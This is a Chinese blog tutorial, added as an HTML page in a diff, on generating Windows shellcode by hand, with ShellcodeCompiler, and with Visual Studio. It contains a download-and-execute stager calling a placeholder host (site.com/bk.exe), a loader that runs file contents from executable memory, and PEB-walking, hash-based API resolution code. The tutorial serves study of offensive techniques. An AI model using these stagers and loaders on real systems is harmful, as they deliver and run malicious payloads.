@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/cray/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/cray/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="description" content="个人学习生活博客,寻志同道合朋友相互学习,共同进步.">
+  <meta name="author" content="Cray">
+  <meta name="keywords" content>
+  <title>Inter 自动化shellcode ~ CrayBlog</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/cray/lib/prettify/tomorrow.min.css">
+
+<link rel="stylesheet" href="/cray/css/main.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/cray/">&nbsp;<strong>CrayBlog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/cray/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/cray/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/cray/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/cray/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" false
+         style="background: url('https://gitee.com//L0yy/BlogImg/raw/master/typora/codeorg2019_social.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    1.7k 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      9 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>学习来源<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-shellcode%E7%9A%84%E6%8F%90%E5%8F%96%E4%B8%8E%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">3gstudent</a></p>
+<p>总结<code>3gstudent</code>的两篇文章</p>
+<blockquote>
+<p>小知识</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th align="center">类型</th>
+<th align="center">32位大小</th>
+<th align="center">64位大小</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">char</td>
+<td align="center">1个字节</td>
+<td align="center">1个字节</td>
+</tr>
+<tr>
+<td align="center">char*（即指针变量）</td>
+<td align="center">4个字节</td>
+<td align="center">8个字节</td>
+</tr>
+<tr>
+<td align="center">short int</td>
+<td align="center">2个字节</td>
+<td align="center">2个字节</td>
+</tr>
+<tr>
+<td align="center">int</td>
+<td align="center">4个字节</td>
+<td align="center">4个字节</td>
+</tr>
+<tr>
+<td align="center">unsigned int</td>
+<td align="center">4个字节</td>
+<td align="center">4个字节</td>
+</tr>
+<tr>
+<td align="center">float</td>
+<td align="center">4个字节</td>
+<td align="center">4个字节</td>
+</tr>
+<tr>
+<td align="center">double</td>
+<td align="center">8个字节</td>
+<td align="center">8个字节</td>
+</tr>
+<tr>
+<td align="center">long</td>
+<td align="center">4个字节</td>
+<td align="center">8个字节</td>
+</tr>
+<tr>
+<td align="center">long long</td>
+<td align="center">8个字节</td>
+<td align="center">8个字节</td>
+</tr>
+<tr>
+<td align="center">unsigned long</td>
+<td align="center">4个字节</td>
+<td align="center">8个字节</td>
+</tr>
+</tbody></table>
+<h2 id="shellcode-生成的三种方法"><a href="#shellcode-生成的三种方法" class="headerlink" title="shellcode 生成的三种方法"></a>shellcode 生成的三种方法</h2><h3 id="1-手工"><a href="#1-手工" class="headerlink" title="1.手工"></a>1.手工</h3><p>可以先利用vs生成exe，运行时去拿汇编出来，这种方式和手写汇编差不多，需要构造各种变量，不推荐使用</p>
+<h3 id="2-使用自动化工具"><a href="#2-使用自动化工具" class="headerlink" title="2.使用自动化工具"></a>2.使用自动化工具</h3><p><a href="https://github.com/NytroRST/ShellcodeCompiler" target="_blank" rel="noopener">shellcode compiler</a><br>使用的时候下载release程序，生成shellcode就能用。目前已经支持平台</p>
+<blockquote>
+<p>Windows (x86 and x64) and Linux (x86 and x64)</p>
+</blockquote>
+<p>使用方法：给了很多例子，这里说明一个Demo</p>
+<pre><code class="c++">    function URLDownloadToFileA(&quot;urlmon.dll&quot;);     
+    //等于GetProcAddress(LoadLibraryA(&quot;urlmon.dll&quot;), &quot;URLDownloadToFileA&quot;);
+    function WinExec(&quot;kernel32.dll&quot;);
+    function ExitProcess(&quot;kernel32.dll&quot;);
+
+    URLDownloadToFileA(0,&quot;https://site.com/bk.exe&quot;,&quot;bk.exe&quot;,0,0);    // 直接调用api即可
+    WinExec(&quot;bk.exe&quot;,0);
+    ExitProcess(0);</code></pre>
+<p>将上面的保存为sourse.txt，然后生成shellcode即可</p>
+<p>命令详见github</p>
+<p>生成的shellcode 加-t命令可以测试，也可以自己写代码加载到内存中测试</p>
+<p>下面时我的测试代码</p>
+<pre><code class="c++">#include &lt;iostream&gt;
+#include &lt;windows.h&gt;
+using namespace std;
+size_t GetSize(LPSTR szFilePath)
+{
+    size_t Size_File = 0;
+    FILE* fp;
+    fopen_s(&amp;fp, szFilePath, &quot;rb&quot;);
+    fseek(fp, 0, SEEK_END);
+    Size_File = ftell(fp);
+    rewind(fp);
+    fclose(fp);
+    return Size_File;
+}
+
+int main()
+{
+    char File_path[MAX_PATH] = { 0, };
+#ifdef _WIN64
+    cout &lt;&lt; &quot;Input 64bit Shellcode:&quot;;
+#else
+    cout &lt;&lt; &quot;Input 32bit Shellcode:&quot;;
+#endif
+    cin &gt;&gt; File_path;
+    if (*File_path == NULL){return -1;}
+    LPVOID lpBuffer = NULL;
+    size_t Shellcode_Size = GetSize(File_path);
+    lpBuffer = VirtualAlloc(0, Shellcode_Size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!lpBuffer){return -1;}
+    FILE *fp;
+    fopen_s(&amp;fp, File_path, &quot;rb&quot;);
+    fread_s(lpBuffer, Shellcode_Size, 1, Shellcode_Size, fp);
+    fclose(fp);
+
+    (*(int(*)())lpBuffer)();//调用该函数
+
+    VirtualFree(lpBuffer, Shellcode_Size, MEM_DECOMMIT);
+    return 0;
+}
+</code></pre>
+<h3 id="3-使用Visual-Studio生成Shellcode"><a href="#3-使用Visual-Studio生成Shellcode" class="headerlink" title="3.使用Visual Studio生成Shellcode"></a>3.使用Visual Studio生成Shellcode</h3><p> <strong>环境</strong></p>
+<p>Visual Studio 2019（其他本版都行）</p>
+<ul>
+<li>使用release生成</li>
+<li>禁用优化</li>
+<li>禁用安全检测（/GS-）</li>
+</ul>
+<p>核心思路，不要使用全局变量，常见的字符串操作都自己写函数</p>
+<p>代码参考3gstudent</p>
+<pre><code class="c++">#include &lt;windows.h&gt;
+#include &lt;Winternl.h&gt;
+#include &lt;stdio.h&gt;
+
+#pragma optimize( &quot;&quot;, off ) 
+void shell_code();
+HANDLE GetKernel32Handle();
+BOOL __ISUPPER__(__in CHAR c);
+CHAR __TOLOWER__(__in CHAR c);
+UINT __STRLEN__(__in LPSTR lpStr1);
+UINT __STRLENW__(__in LPWSTR lpStr1);
+LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2);
+INT __STRCMPI__(__in LPSTR lpStr1, __in LPSTR lpStr2);
+INT __STRNCMPIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2, __in DWORD dwLen);
+LPVOID __MEMCPY__(__in LPVOID lpDst, __in LPVOID lpSrc, __in DWORD dwCount);
+UINT __CalcHash__(__in LPVOID lpStr);
+
+typedef FARPROC(WINAPI* GetProcAddressAPI)(HMODULE, LPCSTR);
+typedef HMODULE(WINAPI* LoadLibraryWAPI)(LPCWSTR);
+typedef ULONG(WINAPI* MESSAGEBOXAPI)(HWND, LPCSTR, LPWSTR, ULONG);
+
+
+void shell_code() {
+
+    LoadLibraryWAPI    loadlibrarywapi = 0;
+    GetProcAddressAPI getprocaddressapi = 0;
+    MESSAGEBOXAPI messageboxapi = 0;
+
+    wchar_t struser32[] = { L&#39;u&#39;, L&#39;s&#39;, L&#39;e&#39;, L&#39;r&#39;, L&#39;3&#39;,L&#39;2&#39;, L&#39;.&#39;, L&#39;d&#39;, L&#39;l&#39;, L&#39;l&#39;, 0 };
+    char MeassageboxA_api[] = { &#39;M&#39;, &#39;e&#39;, &#39;s&#39;, &#39;s&#39;, &#39;a&#39;, &#39;g&#39;, &#39;e&#39;, &#39;B&#39;, &#39;o&#39;, &#39;x&#39;, &#39;A&#39;, 0 };
+    char MeassageText[] = { &#39;H&#39;,&#39;e&#39;,&#39;l&#39;,&#39;l&#39;,&#39;o&#39;,&#39;.&#39;,&#39;W&#39;,&#39;o&#39;,&#39;l&#39;,&#39;r&#39;,&#39;d&#39;,&#39;!&#39;,0 };
+
+    HANDLE hKernel32 = GetKernel32Handle();
+    if (hKernel32 == INVALID_HANDLE_VALUE) {
+        return;
+    }
+    LPBYTE lpBaseAddr = (LPBYTE)hKernel32;
+    PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER)lpBaseAddr;
+    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpBaseAddr + lpDosHdr-&gt;e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddr + pNtHdrs-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    LPDWORD pNameArray = (LPDWORD)(lpBaseAddr + pExportDir-&gt;AddressOfNames);
+    LPDWORD pAddrArray = (LPDWORD)(lpBaseAddr + pExportDir-&gt;AddressOfFunctions);
+    LPWORD pOrdArray = (LPWORD)(lpBaseAddr + pExportDir-&gt;AddressOfNameOrdinals);
+    //CHAR strLoadLibraryA[] = { &#39;L&#39;, &#39;o&#39;, &#39;a&#39;, &#39;d&#39;, &#39;L&#39;, &#39;i&#39;, &#39;b&#39;, &#39;r&#39;, &#39;a&#39;, &#39;r&#39;, &#39;y&#39;, &#39;W&#39;, 0x0 };
+    //CHAR strGetProcAddress[] = { &#39;G&#39;, &#39;e&#39;, &#39;t&#39;, &#39;P&#39;, &#39;r&#39;, &#39;o&#39;, &#39;c&#39;, &#39;A&#39;, &#39;d&#39;, &#39;d&#39;, &#39;r&#39;, &#39;e&#39;, &#39;s&#39;, &#39;s&#39;, 0x0 };
+    UINT HashrLoadLibraryA = 0x6fffef88;
+    UINT HashrGetProcAddress = 0x3f8aaa7e;
+
+    for (UINT i = 0; i &lt; pExportDir-&gt;NumberOfNames; i++) {
+        LPSTR pFuncName = (LPSTR)(lpBaseAddr + pNameArray[i]);
+        //if (!__STRCMPI__(pFuncName, strGetProcAddress)) {
+        if (__CalcHash__(pFuncName) == HashrGetProcAddress) {
+            getprocaddressapi = (GetProcAddressAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]);
+        }
+        //else if (!__STRCMPI__(pFuncName, strLoadLibraryA)) {
+        else if (__CalcHash__(pFuncName) == HashrLoadLibraryA) {
+            loadlibrarywapi = (LoadLibraryWAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]);
+        }
+        if (getprocaddressapi != nullptr &amp;&amp; loadlibrarywapi != nullptr) {
+            messageboxapi = (MESSAGEBOXAPI)getprocaddressapi(loadlibrarywapi(struser32), MeassageboxA_api);
+            messageboxapi(NULL, MeassageText, NULL, 0);
+            return;
+        }
+    }
+}
+
+inline BOOL __ISUPPER__(__in CHAR c) {
+    return (&#39;A&#39; &lt;= c) &amp;&amp; (c &lt;= &#39;Z&#39;);
+};
+inline CHAR __TOLOWER__(__in CHAR c) {
+    return __ISUPPER__(c) ? c - &#39;A&#39; + &#39;a&#39; : c;
+};
+
+UINT __STRLEN__(__in LPSTR lpStr1)
+{
+    UINT i = 0;
+    while (lpStr1[i] != 0x0)
+        i++;
+    return i;
+}
+
+UINT __STRLENW__(__in LPWSTR lpStr1)
+{
+    UINT i = 0;
+    while (lpStr1[i] != L&#39;\0&#39;)
+        i++;
+    return i;
+}
+
+LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2)
+{
+    CHAR c = __TOLOWER__(((PCHAR)(lpStr2++))[0]);
+    if (!c)
+        return lpStr1;
+    UINT dwLen = __STRLENW__(lpStr2);
+    do
+    {
+        CHAR sc;
+        do
+        {
+            sc = __TOLOWER__(((PCHAR)(lpStr1)++)[0]);
+            if (!sc)
+                return NULL;
+        } while (sc != c);
+    } while (__STRNCMPIW__(lpStr1, lpStr2, dwLen) != 0);
+    return (lpStr1 - 1); // FIXME -2 ?
+}
+
+INT __STRCMPI__(
+    __in LPSTR lpStr1,
+    __in LPSTR lpStr2)
+{
+    int  v;
+    CHAR c1, c2;
+    do
+    {
+        c1 = *lpStr1++;
+        c2 = *lpStr2++;
+        // The casts are necessary when pStr1 is shorter &amp; char is signed 
+        v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);
+    } while ((v == 0) &amp;&amp; (c1 != &#39;\0&#39;) &amp;&amp; (c2 != &#39;\0&#39;));
+    return v;
+}
+
+INT __STRNCMPIW__(
+    __in LPWSTR lpStr1,
+    __in LPWSTR lpStr2,
+    __in DWORD dwLen)
+{
+    int  v;
+    CHAR c1, c2;
+    do {
+        dwLen--;
+        c1 = ((PCHAR)lpStr1++)[0];
+        c2 = ((PCHAR)lpStr2++)[0];
+        /* The casts are necessary when pStr1 is shorter &amp; char is signed */
+        v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);
+    } while ((v == 0) &amp;&amp; (c1 != 0x0) &amp;&amp; (c2 != 0x0) &amp;&amp; dwLen &gt; 0);
+    return v;
+}
+
+LPSTR __STRCAT__(
+    __in LPSTR    strDest,
+    __in LPSTR strSource)
+{
+    LPSTR d = strDest;
+    LPSTR s = strSource;
+    while (*d) d++;
+    do { *d++ = *s++; } while (*s);
+    *d = 0x0;
+    return strDest;
+}
+
+LPVOID __MEMCPY__(
+    __in LPVOID lpDst,
+    __in LPVOID lpSrc,
+    __in DWORD dwCount)
+{
+    LPBYTE s = (LPBYTE)lpSrc;
+    LPBYTE d = (LPBYTE)lpDst;
+    while (dwCount--)
+        * d++ = *s++;
+    return lpDst;
+}
+
+UINT __CalcHash__(
+    __in LPVOID lpStr
+)
+{
+    UINT ApiHash = 0;
+    LPBYTE s = (LPBYTE)lpStr;
+    do
+    {
+        ApiHash = (ApiHash &lt;&lt; 7) + (ApiHash &gt;&gt; 25) + *s;
+    } while (*s++);
+    return ApiHash;
+}
+
+HANDLE GetKernel32Handle() {
+    HANDLE hKernel32 = INVALID_HANDLE_VALUE;
+#ifdef _WIN64
+    PPEB lpPeb = (PPEB)__readgsqword(0x60);
+#else
+    PPEB lpPeb = (PPEB)__readfsdword(0x30);
+#endif
+    PLIST_ENTRY pListHead = &amp;lpPeb-&gt;Ldr-&gt;InMemoryOrderModuleList;
+    PLIST_ENTRY pListEntry = pListHead-&gt;Flink;
+    WCHAR strDllName[MAX_PATH];
+    WCHAR strKernel32[] = { &#39;k&#39;, &#39;e&#39;, &#39;r&#39;, &#39;n&#39;, &#39;e&#39;, &#39;l&#39;, &#39;3&#39;, &#39;2&#39;, &#39;.&#39;, &#39;d&#39;, &#39;l&#39;, &#39;l&#39;, L&#39;\0&#39; };
+
+    while (pListEntry != pListHead) {
+        PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+        if (pModEntry-&gt;FullDllName.Length) {
+            DWORD dwLen = pModEntry-&gt;FullDllName.Length;
+            __MEMCPY__(strDllName, pModEntry-&gt;FullDllName.Buffer, dwLen);
+            strDllName[dwLen / sizeof(WCHAR)] = L&#39;\0&#39;;
+            if (__STRSTRIW__(strDllName, strKernel32)) {
+                hKernel32 = pModEntry-&gt;DllBase;
+                break;
+            }
+        }
+        pListEntry = pListEntry-&gt;Flink;
+    }
+    return hKernel32;
+}
+
+//void __declspec(naked) END_SHELLCODE(void) {}
+
+void END_SHELLCODE(void) {}
+
+int main()
+{
+    shell_code();
+    FILE* output_file;
+#ifdef _WIN64
+    fopen_s(&amp;output_file, &quot;shellcode_x64.bin&quot;, &quot;wb&quot;);
+#else
+    fopen_s(&amp;output_file, &quot;shellcode_x32.bin&quot;, &quot;wb&quot;);
+#endif
+    fwrite(shell_code, (int)END_SHELLCODE - (int)shell_code, 1, output_file);
+    fclose(output_file);
+    return 0;
+}</code></pre>
+<p>稍微修改了一点，使用<strong>x64</strong>位编译就可以生成<strong>64位shellcode</strong>，使用<strong>x32</strong>就能生成32位<strong>shellcode</strong>。</p>
+<p>使用了<strong>hash函数名</strong>的方式去找API，不用开那么大栈空间</p>
+<p>总结一下：</p>
+<p>类似<code>memcpy、strlen、strcat</code>等等常用函数，都自行实现，Shellcode的第一个函数要写在开始处。</p>
+<p>C++ 中字符数组定义格式有下面三种</p>
+<pre><code class="c++">    const char* str1 = &quot;I am Str1!&quot;;
+    char str2[] = &quot;I am Str2!&quot;;
+    char str3[] = { &#39;H&#39;,&#39;e&#39;,&#39;l&#39;,&#39;l&#39;,&#39;o&#39;,&#39;.&#39;,&#39;W&#39;,&#39;o&#39;,&#39;l&#39;,&#39;r&#39;,&#39;d&#39;,&#39;!&#39;,0 };</code></pre>
+<p>前面两种都是将字符串保存在<code>rdata</code>段中，第三种方式是将字符串保存在栈中，最后的0表示’\0’,如果没有结束标志，可能会操作到栈后面的数据。</p>
+
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+            
+              <span>
+                <i class="iconfont icon-tag"></i>
+                
+                  <a class="hover-with-bg" href="/cray/tags/汇编/">汇编</a>
+                
+              </span>
+            
+            </p>
+            
+              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container">
+        <div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+      </div>
+    
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>
+      var disqus_config = function () {
+        this.page.url = 'http://l0yy.gitee.io/cray/2020/03/18/自动化ShellCode/';
+        this.page.identifier = '/2020/03/18/自动化ShellCode/';
+      };
+      var oldLoad = window.onload;
+      window.onload = function () {
+        var d = document, s = d.createElement('script');
+        s.type = 'text/javascript';
+        s.src = '//' + 'https-l0yy-github-io' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+      };
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments
+        powered by Disqus.</a></noscript>
+  </div>
+
+
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+
+    
+  
+    <!-- 不蒜子统计PV -->
+    
+    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
+          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
+  
+  
+    <!-- 不蒜子统计UV -->
+    
+    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
+            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
+  
+  <br>
+
+
+
+    
+
+
+    <!-- cnzz Analytics icon -->
+    
+
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script src="/cray/js/main.js" ></script>
+
+
+  <script src="/cray/js/lazyload.js" ></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var main = $('main');
+      var tocT = navHeight + (toc.offset().top - main.offset().top);
+      var tocLimMin = main.offset().top - navHeight;
+      var tocLimMax = $('#comments').offset().top - navHeight;
+      $(window).scroll(function () {
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': tocT,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  ');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Inter 自动化shellcode&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/cray/js/local-search.js" ></script>
+  <script>
+    var path = "/cray/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
